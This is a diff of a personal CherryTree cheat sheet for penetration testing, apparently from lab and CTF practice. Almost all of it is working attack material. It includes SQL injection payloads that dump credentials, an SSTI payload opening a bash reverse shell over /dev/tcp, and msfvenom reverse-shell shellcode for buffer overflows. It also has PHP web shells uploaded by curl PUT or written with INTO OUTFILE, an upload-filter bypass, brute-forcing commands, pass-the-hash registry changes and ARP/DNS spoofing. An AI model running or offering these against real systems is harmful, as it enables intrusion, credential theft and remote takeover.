@@ -1,116 +1,561 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="General Notes" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1626779872" ts_lastsave="1639079075">
-    <rich_text scale="h3" weight="heavy">SQL Injection</rich_text>
-    <rich_text>
-
-</rich_text>
-    <rich_text scale="h3" weight="heavy">Enumeration Payloads</rich_text>
-    <rich_text>
-
-Enumerate columns
-</rich_text>
-    <rich_text scale="h3">' OR '1'='1' ORDER BY 5#</rich_text>
-    <rich_text>
-
-‘ OR ’1'='1' UNION SELECT 1,2,3,4,5...#
-
-</rich_text>
-    <rich_text weight="heavy">Enumerate Databases </rich_text>
-    <rich_text>
-' union select concat(schema_name),2,3,4,5,6 from information_schema.schemata#
- 
-</rich_text>
-    <rich_text weight="heavy">Enumerating table names from information_schema</rich_text>
-    <rich_text>
-' union select 1,2,3,table_name,5,6 from information_schema.tables#
-</rich_text>
-    <rich_text weight="heavy">Specifying Database</rich_text>
-    <rich_text>
-' union select 1,2,3,table_name,5,6 from information_schema.tables where table_schema="Staff"#
-
-</rich_text>
-    <rich_text weight="heavy">Enumerating column names from information_schema</rich_text>
-    <rich_text>
-' union select 1,2,3,column_name,5,6 from information_schema.columns#
-
-</rich_text>
-    <rich_text weight="heavy">Dumping </rich_text>
-    <rich_text style="italic" weight="heavy">Columns</rich_text>
-    <rich_text weight="heavy"> from </rich_text>
-    <rich_text style="italic" weight="heavy">Users</rich_text>
-    <rich_text weight="heavy"> Table</rich_text>
-    <rich_text>
-'union select 1,2,3,Username,Password,6 from Users#
-
-</rich_text>
-    <rich_text weight="heavy">Enumerate Table names from a specific database</rich_text>
-    <rich_text>
-' union select concat(table_name),2,3,4,5,6 from information_schema.tables where table_schema"users"# 
-
-</rich_text>
-    <rich_text weight="heavy">Enumerate Column names from a specific database and table</rich_text>
-    <rich_text>
-' union select column_name,2,3,4,5,6 from information_schema.columns where table_name"UserDetails"#
- 
-</rich_text>
-    <rich_text weight="heavy">Dumping username and password from USERS table and USERDETAILS column</rich_text>
-    <rich_text>
-' union SELECT group_concat(Username,":",Password),2,3,4,5,6 FROM users.UserDetails-- ;
-
-
-</rich_text>
-    <rich_text weight="heavy">OpenDocMan 1.2.7 Manual SQLi</rich_text>
-    <rich_text>
-
-ajax_udf.php?q=1&amp;add_value=odm_user UNION SELECT 1,(database()),3,4,5,6,7,8,9
-
-ajax_udf.php?q=1&amp;add_value=odm_user UNION SELECT 1,table_name,3,4,5,6,7,8,9 from information_schema.tables where table_schema=database()
-
- 
- 
-</rich_text>
-    <rich_text scale="h3" weight="heavy"> Useful commands</rich_text>
-    <rich_text>
-•  database()
-•  user()
-•  version()
-
-
-</rich_text>
-    <rich_text scale="h3" weight="heavy">Directory Scanning</rich_text>
-    <rich_text>
-
-• Scan for files with extensions [ex: dirb &lt;HOST&gt; -X .php]
-
-
-</rich_text>
-    <rich_text scale="h2" weight="heavy">Fuzzing</rich_text>
-    <rich_text>
+  <node name="General Notes" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1626779872" ts_lastsave="1639344443">
+    <rich_text>Close port
+sudo kill $(sudo lsof -t -i:445)</rich_text>
+    <node name="Recon &amp; Enumeration" unique_id="11" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344321" ts_lastsave="1639345348">
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Fuzzing</rich_text>
+      <rich_text>
 
 • Fuzz for params [wfuzz -c -w &lt;WORDLIST&gt; --hc 404 &lt;HOST?FUZZ=example.txt&gt;]
 • Fuzz for files and extensions
 
 
 </rich_text>
-    <rich_text scale="h2" weight="heavy">Privilege Escalation
-</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text scale="h2" weight="heavy">Linux
-</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text weight="heavy">Good for guidance</rich_text>
-    <rich_text>
-</rich_text>
-    <rich_text link="webs https://tryhackme.com/room/linuxprivescarena">https://tryhackme.com/room/linuxprivescarena</rich_text>
-    <rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">WordPress</rich_text>
+      <rich_text>
+
+WPScan Brute-force:
+
+wpscan --url &lt;TARGET&gt; -U &lt;USER&gt; -P /usr/share/wordlists/rockyou.txt
+
+Agressive Enumeration:
+
+wpscan --url http://symfonos.local/h3l105/ -e ap,at,tt,cb,dbe,u1-20,m --plugins-detection aggressive
+
 
 </rich_text>
-    <rich_text link="webs https://tryhackme.com/room/windows10privesc">https://tryhackme.com/room/windows10privesc</rich_text>
-    <rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Host Discovery</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text weight="heavy">ICMP Echo
+</rich_text>
+      <rich_text>nmap -sP &lt;subnet&gt;
+
+</rich_text>
+      <rich_text weight="heavy">ARP</rich_text>
+      <rich_text>
+arp-scan -I &lt;network_interface&gt; -localnet
+netdiscover -i &lt;network_interface&gt; -r &lt;ip_range&gt;
+
+</rich_text>
+      <rich_text weight="heavy">Ping Sweep</rich_text>
+      <rich_text>
+fping -g -r 1 172.16.37.0/24
+
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Domain Discovery</rich_text>
+      <rich_text>
+
+Forward DNS Lookups
+nslookup &lt;ip_address&gt;
+dig @&lt;host1_ip&gt; -x &lt;another_host_ip&gt; +nocookie
+dig @&lt;ip&gt; &lt;domain&gt; -t AXFR +nocookie
+
+Reverse DNS Lookups
+crunch 11 11 -t 172.16.5.%% -o iplist.txt
+for ip in $(cat iplist.txt); do dig @172.16.5.10 -x $ip +nocookie; done
+
+</rich_text>
+      <rich_text weight="heavy">Identify default gateway of a host/subnet</rich_text>
+      <rich_text>
+route
+
+traceroute &lt;ip&gt; -m 5 -T</rich_text>
+      <rich_text weight="heavy">
+</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">SNMP</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text weight="heavy">Brute-force Communities</rich_text>
+      <rich_text>
+onesixtyone -c &lt;wordlist&gt; -p 161 &lt;host&gt;
+
+</rich_text>
+      <rich_text weight="heavy">Enumerate Windows Users</rich_text>
+      <rich_text>
+snmpwalk -c &lt;community&gt; -v1 &lt;host&gt; 10.10.10.5 1.3.6.1.4.1.77.1.2.25
+
+nmap -sU -p 161 --script=snmp-win32-services &lt;host&gt;
+
+nmap -sU -p 161 &lt;host&gt; --script snmp-brute (/usr/share/nmap/nselib/data/snmpcommunities.lst)
+--script-args snmp-brute.communitiesdb=&lt;wordlist&gt;
+
+</rich_text>
+      <rich_text weight="heavy">List software installed on the machine</rich_text>
+      <rich_text>
+snmpwalk -c &lt;community_string&gt; -v1 &lt;host&gt; hrSWInstalledName
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">SMB</rich_text>
+      <rich_text>
+nmap -sC --script=smb-enum-users 192.168.201.14
+
+</rich_text>
+      <rich_text weight="heavy">Send files</rich_text>
+      <rich_text>
+smbmap -H 192.168.201.17 -u david -p qwertyuioplkjhgfdsazxcvbnm --upload /home/xcatolin/rev.php secured\\rev.php
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">POP3</rich_text>
+      <rich_text>
+
+user &lt;user&gt;
+pass &lt;pass&gt;
+list
+retr &lt;email id&gt;
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">UDP</rich_text>
+      <rich_text>
+nmap -vv — reason -Pn -sU -A — top-ports=20 — version-all
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">SQL</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text weight="heavy">Connect and enumerate databases</rich_text>
+      <rich_text>
+mysql -h 192.168.201.11 -u root -p
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">MSSQL</rich_text>
+      <rich_text>
+nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=fooadmin,mssql.password=fooadmin,ms-sql-xp-cmdshell.cmd="whoami" 172.16.64.199
+
+</rich_text>
+      <rich_text weight="heavy">Modifying values on MySQL</rich_text>
+      <rich_text>
+update users set adm="yes" where username="tracking1";
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">RPCbind</rich_text>
+      <rich_text>
+
+rpcinfo -p &lt;host&gt;
+
+# showmount -e 192.168.201.8
+Export list for 192.168.201.8:
+/home/vulnix *
+
+mount -t nfs 192.168.201.8:/home /share
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Crunch</rich_text>
+      <rich_text>
+
+Generating from a specific pattern
+
+crunch 13 13 -t bev,%%@@^1995 -o bigtom
+
+@ lowercase
+, uppercase
+% numbers
+^ special chars
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Hydra</rich_text>
+      <rich_text>
+
+• POP3: hydra -L &lt;USER LIST&gt; -P &lt;PASS LIST&gt; -t20 &lt;HOST&gt; -s&lt;PORT&gt; -I pop3
+
+hydra -l admin -P pass.txt 192.168.71.129 http-post-form "/dvwa/login.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Login Failed"
+
+</rich_text>
+      <rich_text weight="heavy">Brute-forcing Subdomains</rich_text>
+      <rich_text>
+wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u "</rich_text>
+      <rich_text link="webs http://cmess.thm/">http://cmess.thm/</rich_text>
+      <rich_text>" -H "Host: FUZZ.cmess.thm" --hw 290
+</rich_text>
+      <rich_text weight="heavy">
+Brute-force a single param</rich_text>
+      <rich_text>
+hydra -l "" -P /usr/share/dirb/wordlists/big.txt 192.168.174.10 http-post-form "/kzMb5nVYJw/index.php:key=^PASS^&amp;Login=Login:invalid key" -f
+
+</rich_text>
+    </node>
+    <node name="Exploitation" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344165" ts_lastsave="1639344432">
+      <rich_text scale="h3" weight="heavy">Buffer Overflows</rich_text>
+      <rich_text>
+
+bad = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+
+
+
+</rich_text>
+      <rich_text scale="h3">Spiking</rich_text>
+      <rich_text>
+# trun.spk 
+s_readline(); 
+s_string("TRUN "); 
+s_string_variable("0;) 
+
+generic_send_tcp &lt;HOST&gt; &lt;PORT&gt; trun.spk 0 0
+
+</rich_text>
+      <rich_text scale="h3">Generate pattern:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text justification="center" family="monospace" style="italic" background="#ffffffffffff" foreground="#000000000000">/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 1000</rich_text>
+      <rich_text>
+
+
+</rich_text>
+      <rich_text scale="h3">Get the offset:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text justification="center" style="italic" background="#ffffffffffff" foreground="#000000000000">/opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l 1000 -q </rich_text>
+      <rich_text style="italic" background="#ffffffffffff" foreground="#000000000000">&lt;ACCESS VIOLATION&gt;</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text justification="center" style="italic" background="#ffffffffffff" foreground="#000000000000">!mona findmsp</rich_text>
+      <rich_text>
+
+• The manual way is to send bytes and overwrite EIP. Use A's and B's in order to diferentiate
+</rich_text>
+      <rich_text style="italic">• To reach EIP you increase 4 bytes after the Offset.</rich_text>
+      <rich_text>
+
+
+</rich_text>
+      <rich_text scale="h3">0x03 Fuzz for badchars.</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text justification="center" style="italic" background="#ffffffffffff" foreground="#000000000000">buffer = "A" * &lt;OFFSET&gt; + "BBBB" + bad</rich_text>
+      <rich_text>
+
+
+</rich_text>
+      <rich_text scale="h3">0x04 Identify the Return Address:</rich_text>
+      <rich_text>
+
+• Look for JMP ESP on the binary or a DLL without ASLR
+
+</rich_text>
+      <rich_text scale="h3">0x05 </rich_text>
+      <rich_text>Generate ShellCode
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.8.80.34 LPORT=4444 -b '\x00\x07\x2e\xa0' EXITFUNC=thread -f python -v payload</rich_text>
+      <rich_text justification="center" style="italic">
+
+</rich_text>
+      <rich_text justification="center" style="italic" background="#ffffffffffff" foreground="#000000000000">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.102 LPORT=4444 EXITFUNC=thread -b "\x00" -f c</rich_text>
+      <rich_text>
+
+
+
+</rich_text>
+      <rich_text scale="h3" weight="heavy">SQL Injection</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text scale="h3" weight="heavy">Enumeration Payloads</rich_text>
+      <rich_text>
+
+Enumerate columns
+</rich_text>
+      <rich_text scale="h3">' OR '1'='1' ORDER BY 5#</rich_text>
+      <rich_text>
+
+‘ OR ’1'='1' UNION SELECT 1,2,3,4,5...#
+
+</rich_text>
+      <rich_text weight="heavy">Enumerate Databases </rich_text>
+      <rich_text>
+' union select concat(schema_name),2,3,4,5,6 from information_schema.schemata#
+ 
+</rich_text>
+      <rich_text weight="heavy">Enumerating table names from information_schema</rich_text>
+      <rich_text>
+' union select 1,2,3,table_name,5,6 from information_schema.tables#
+</rich_text>
+      <rich_text weight="heavy">Specifying Database</rich_text>
+      <rich_text>
+' union select 1,2,3,table_name,5,6 from information_schema.tables where table_schema="Staff"#
+
+</rich_text>
+      <rich_text weight="heavy">Enumerating column names from information_schema</rich_text>
+      <rich_text>
+' union select 1,2,3,column_name,5,6 from information_schema.columns#
+
+</rich_text>
+      <rich_text weight="heavy">Dumping </rich_text>
+      <rich_text style="italic" weight="heavy">Columns</rich_text>
+      <rich_text weight="heavy"> from </rich_text>
+      <rich_text style="italic" weight="heavy">Users</rich_text>
+      <rich_text weight="heavy"> Table</rich_text>
+      <rich_text>
+'union select 1,2,3,Username,Password,6 from Users#
+
+</rich_text>
+      <rich_text weight="heavy">Enumerate Table names from a specific database</rich_text>
+      <rich_text>
+' union select concat(table_name),2,3,4,5,6 from information_schema.tables where table_schema"users"# 
+
+</rich_text>
+      <rich_text weight="heavy">Enumerate Column names from a specific database and table</rich_text>
+      <rich_text>
+' union select column_name,2,3,4,5,6 from information_schema.columns where table_name"UserDetails"#
+ 
+</rich_text>
+      <rich_text weight="heavy">Dumping username and password from USERS table and USERDETAILS column</rich_text>
+      <rich_text>
+' union SELECT group_concat(Username,":",Password),2,3,4,5,6 FROM users.UserDetails-- ;
+
+
+</rich_text>
+      <rich_text weight="heavy">OpenDocMan 1.2.7 Manual SQLi</rich_text>
+      <rich_text>
+
+ajax_udf.php?q=1&amp;add_value=odm_user UNION SELECT 1,(database()),3,4,5,6,7,8,9
+
+ajax_udf.php?q=1&amp;add_value=odm_user UNION SELECT 1,table_name,3,4,5,6,7,8,9 from information_schema.tables where table_schema=database()
+
+</rich_text>
+      <rich_text scale="h3" weight="heavy"> Useful commands</rich_text>
+      <rich_text>
+•  database()
+•  user()
+•  version()
+
+
+
+
+</rich_text>
+      <rich_text weight="heavy">SSTI</rich_text>
+      <rich_text>
+
+{% import os %}{{os.system('bash -c "bash -i &gt;&amp; /dev/tcp/192.168.201.26/1234 0&gt;&amp;1"')}}
+
+</rich_text>
+      <rich_text weight="heavy">LFI</rich_text>
+      <rich_text>
+
+• Test between GET, POST and different Encoding methods
+
+FreeBSD
+/usr/local/etc/apacheX/httpd.conf
+
+</rich_text>
+      <rich_text weight="heavy">RFI</rich_text>
+      <rich_text>
+python3 -m http.server
+endpoint.php?param=http://localhost:8000/rev.php
+
+
+</rich_text>
+      <rich_text weight="heavy">File Upload with cURL PUT</rich_text>
+      <rich_text>
+
+curl -vX PUT -d '&lt;?php system($_GET["cmd"]);?&gt;' </rich_text>
+      <rich_text link="webs http://192.168.201.7/test/xcatolin.php">http://192.168.201.7/test/xcatolin.php</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text weight="heavy">PTY Spawning</rich_text>
+      <rich_text>
+/usr/bin/script -qc /bin/bash /dev/null
+
+stty raw -echo
+
+
+phpmyadmin command injection
+
+SELECT "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "/var/www/html/wordpress/shell.php"
+
+
+</rich_text>
+      <rich_text weight="heavy">PHP Command Injection/Execution</rich_text>
+      <rich_text>
+
+echo "&lt;pre&gt;";system("ls -la /var/www");echo"&lt;\pre&gt;";
+
+ 
+</rich_text>
+      <rich_text weight="heavy">File Upload Bypass Magic Bytes</rich_text>
+      <rich_text>
+That makes so that the file header is a jpeg, the extension a gif and the content of php
+ 
+ echo 'FFD8FFEo' | xxd -r -p &gt; xca.gif
+ echo '&lt;?php $c=$_GET['c']; echo `$c`; ?&gt;' &gt;&gt; xca.gif
+
+
+</rich_text>
+      <rich_text scale="h3" weight="heavy">Windows</rich_text>
+      <rich_text>
+C:/Windows/System32/Config/SAM
+C:/Windows/System32/Config/SYSTEM
+Those are locked while system is running.
+
+C:/Windows/System32/config/RegBack - This is accessible through LFI and stuff.</rich_text>
+    </node>
+    <node name="Post-exploitation" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344266" ts_lastsave="1639394553">
+      <rich_text weight="heavy">Update SQL Database</rich_text>
+      <rich_text>
+update &lt;table&gt;
+set &lt;item&gt;='new_content' where &lt;item&gt;='item';
+set pwd='admin' where login='admin';
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Pivoting &amp; Port Forwarding</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text weight="heavy">Socat</rich_text>
+      <rich_text>
+socat TCP-LISTEN:&lt;local_port&gt;,fork,reuseaddr TCP:&lt;remote_ip&gt;:&lt;remote_port&gt; &amp;
+
+</rich_text>
+      <rich_text weight="heavy">cURL</rich_text>
+      <rich_text>
+curl --proxy http://192.168.1.45:31337 127.0.0.1:8080
+
+</rich_text>
+      <rich_text weight="heavy">SSH</rich_text>
+      <rich_text>
+ssh -L 3000:homepc:23 user@ssh-server
+localport:remotehost:remoteport
+
+</rich_text>
+      <rich_text weight="heavy">Ncat</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text style="italic">ncat -l -v -p 2222 -c 'ncat 172.16.50.222 22'</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text weight="heavy">SSH (22) through Squid Proxy (3128)</rich_text>
+      <rich_text>
+proxytunnel -p 192.168.201.9:3128 -d 127.0.0.1:22 -a 1234
+
+there was a squid proxy running on 3128 and a filtered SSH on 22, so that command basically tunnels to 3128 -&gt; 22 -&gt; 1234 on localhost
+
+then ssh user@127.0.0.1 -p 1234
+
+</rich_text>
+      <rich_text weight="heavy">Chisel</rich_text>
+      <rich_text>
+
+On local machine;
+chisel server -p 8001 --reverse
+
+On foothold attacked machine;
+./chisel client lhost:8001 R:8000:127.0.0.1:8000
+
+8000 é a porta que tava aberta só pra localhost no alvo, e 8001 é a porta que ficou escutando na minha máquina.
+
+remote:8000 -&gt; local:8001 -&gt; local:8000
+
+
+</rich_text>
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Spoofing &amp; MiTM</rich_text>
+      <rich_text>
+
+</rich_text>
+      <rich_text weight="heavy">DNS Spoofing</rich_text>
+      <rich_text>
+echo "&lt;IP&gt; *.domain.com" &gt; dns
+dnsspoof -i &lt;network_interface&gt; -f dns
+
+</rich_text>
+      <rich_text weight="heavy">ARP Spoofing</rich_text>
+      <rich_text>
+echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+
+arpspoof -i &lt;network_interface&gt; -t &lt;ip1&gt; &lt;ip2&gt;</rich_text>
+      <node name="Windows" unique_id="15" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639394468" ts_lastsave="1639394657">
+        <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000">Maintaining Access</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text weight="heavy">Enable RDP</rich_text>
+        <rich_text>
+run getgui -e
+
+</rich_text>
+        <rich_text weight="heavy">Add user to allowed group</rich_text>
+        <rich_text>
+net localgroup “&lt;group&gt;” “&lt;user&gt;” /add
+
+
+</rich_text>
+        <rich_text weight="heavy">Pass-the-hash</rich_text>
+        <rich_text>
+
+Configure target:
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+• Add new DWORD named </rich_text>
+        <rich_text weight="heavy">LocalAccountTokenFilterPolicy</rich_text>
+        <rich_text> with the value of </rich_text>
+        <rich_text weight="heavy">1</rich_text>
+        <rich_text>
+HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters
+• Add new DWORD named </rich_text>
+        <rich_text weight="heavy">RequireSecuritySignature</rich_text>
+        <rich_text> with the value of </rich_text>
+        <rich_text weight="heavy">0</rich_text>
+        <rich_text>
+
+
+Powershell one-liners:
+
+</rich_text>
+        <rich_text style="italic">Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWORD</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text style="italic">Set-ItemProperty -Path HKLM:\HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters -Name RequireSecuritySignature -Value 0 -Type DWORD</rich_text>
+        <rich_text>
+
+
+Using reg command:
+
+</rich_text>
+        <rich_text style="italic">reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /V LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text style="italic">reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters" /v RequireSecuritySignature /t REG_DWORD /d 0 /f</rich_text>
+        <rich_text>
+
+
+Pass NTLM hash over RDP (xfreerdp)
+
+xfreerdp /u:&lt;user&gt; /d:&lt;domain&gt; /pth:&lt;hash&gt; /v:&lt;host&gt;
+
+
+
+
+</rich_text>
+      </node>
+      <node name="Linux" unique_id="16" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639394471" ts_lastsave="1639394547">
+        <rich_text weight="heavy">Escape rbash with SSH:</rich_text>
+        <rich_text>
+ssh mindy@192.168.201.19 -t "bash --noprofile"
+
+</rich_text>
+      </node>
+    </node>
+    <node name="Privilege Escalation" unique_id="12" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344338" ts_lastsave="1639344356">
+      <node name="Linux" unique_id="13" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344352" ts_lastsave="1639391954">
+        <rich_text weight="heavy">Good for guidance</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text link="webs https://tryhackme.com/room/linuxprivescarena">https://tryhackme.com/room/linuxprivescarena</rich_text>
+        <rich_text>
+
+</rich_text>
+        <rich_text link="webs https://tryhackme.com/room/windows10privesc">https://tryhackme.com/room/windows10privesc</rich_text>
+        <rich_text>
 
 Ubuntu 12 = DirtyCow!
 FreeBSD 9.0 = 2 exploits
@@ -132,8 +577,8 @@ FreeBSD 9.0 = 2 exploits
 • pspy and ps aux may have something
 
 </rich_text>
-    <rich_text weight="heavy">Find command</rich_text>
-    <rich_text>
+        <rich_text weight="heavy">Find command</rich_text>
+        <rich_text>
 find /root/thefinalflag.txt -exec cat {} \;
 find /home -exec /bin/bash \;
 
@@ -149,480 +594,161 @@ cron.weekly
 • /root
 
 </rich_text>
-    <rich_text weight="heavy">Run commands with MySQL as root</rich_text>
-    <rich_text>
+        <rich_text weight="heavy">Run commands with MySQL as root</rich_text>
+        <rich_text>
 
 select sys_exec('chmod 777 -R /root');
 
 
 </rich_text>
-    <rich_text weight="heavy">Link a command to another</rich_text>
-    <rich_text>
+        <rich_text weight="heavy">Link a command to another</rich_text>
+        <rich_text>
 
 ln -s /bin/sh ps
 </rich_text>
-    <rich_text style="italic">This links the command ps to /bin/sh in order to privesc</rich_text>
-    <rich_text>
+        <rich_text style="italic">This links the command ps to /bin/sh in order to privesc</rich_text>
+        <rich_text>
 
 /usr/bin/php7.2 -r "pcntl_exec('/bin/bash', ['-p']);"
 
 </rich_text>
-    <rich_text weight="heavy">nmap from 2.02 to 5.21 has interactive mode</rich_text>
-    <rich_text>
+        <rich_text weight="heavy">nmap from 2.02 to 5.21 has interactive mode</rich_text>
+        <rich_text>
 
 nmap --interactive
 nmap&gt; !sh
 
 
+</rich_text>
+        <rich_text weight="heavy">Compile x86_64 exploit to x86 system</rich_text>
+        <rich_text>
+gcc -m32 &lt;exploit&gt; &lt;executable&gt;</rich_text>
+      </node>
+      <node name="Windows" unique_id="14" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344356" ts_lastsave="1639345692">
+        <rich_text weight="heavy">Unquoted Service Paths</rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text underline="single" style="italic">C:\&gt;</rich_text>
+        <rich_text> wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" | findstr /i /v """
 
+sc qc &lt;service&gt;
+sc qc CIJSRegister
+
+Metasploit -&gt; exploit/windows/local/trusted_service_path</rich_text>
+      </node>
+    </node>
+    <node name="Metasploit" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1639344196" ts_lastsave="1639344889">
+      <rich_text family="monospace" background="#ffffffffffff" foreground="#000000000000" weight="heavy">Meterpreter</rich_text>
+      <rich_text>
 
 </rich_text>
-    <rich_text scale="h2" weight="heavy">Buffer Overflow</rich_text>
-    <rich_text>
-
